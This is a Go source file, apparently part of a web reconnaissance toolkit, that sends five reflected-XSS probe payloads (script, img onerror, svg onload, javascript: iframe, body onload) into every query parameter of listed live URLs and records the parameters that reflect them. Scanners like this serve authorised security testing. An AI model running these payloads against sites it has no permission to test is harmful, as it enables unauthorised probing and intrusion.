package scanner

import (
	"bufio"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

var payloads = []string{
	`"><script>alert(1)</script>`,
	`"><img src=x onerror=alert(1)>`,
	`"><svg onload=alert(1)>`,
	`"><iframe src="javascript:alert(1)">`,
	`<body onload=alert(1)>`,
}

// Send XSS payloads to each parameter and check reflection in response
func RunXSSScan(domain string) {
	livePath := fmt.Sprintf("output/%s/%s_live.txt", domain, domain)
	file, err := os.Open(livePath)
	if err != nil {
		fmt.Println("[-] Cannot open live hosts file:", err)
		return
	}
	defer file.Close()

	var targets []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.Fields(scanner.Text())
		if len(line) > 0 {
			targets = append(targets, line[0])
		}
	}

	vulnResults := []string{}
	client := &http.Client{Timeout: 8 * time.Second}

	fmt.Println("[*] Scanning for reflected XSS...")

	for _, base := range targets {
		testURL, err := url.Parse(base)
		if err != nil {
			continue
		}

		q := testURL.Query()
		if len(q) == 0 {
			continue // Skip URLs without query parameters
		}

		for param := range q {
			for _, payload := range payloads {
				modified := url.Values{}
				for k, v := range q {
					if k == param {
						modified.Set(k, payload)
					} else {
						modified[k] = v
					}
				}
				testURL.RawQuery = modified.Encode()

				resp, err := client.Get(testURL.String())
				if err != nil {
					continue
				}

				var buf strings.Builder
				_, err = io.Copy(&buf, resp.Body)
				resp.Body.Close()
				if err != nil {
					continue
				}

				body := buf.String()
				if strings.Contains(body, payload) {
					result := fmt.Sprintf("[VULNERABLE] %s → param: %s → payload: %s", testURL.String(), param, payload)
					fmt.Println(result)
					vulnResults = append(vulnResults, result)
					break // Found XSS on this param, no need to test more payloads
				}
			}
		}
	}

	// Save results
	outDir := fmt.Sprintf("output/%s/%s_vulns", domain, domain)
	os.MkdirAll(outDir, 0755)
	outPath := fmt.Sprintf("%s/xss.txt", outDir)
	os.WriteFile(outPath, []byte(strings.Join(vulnResults, "\n")), 0644)
	fmt.Println("[+] XSS scan complete. Results saved to:", outPath)
}
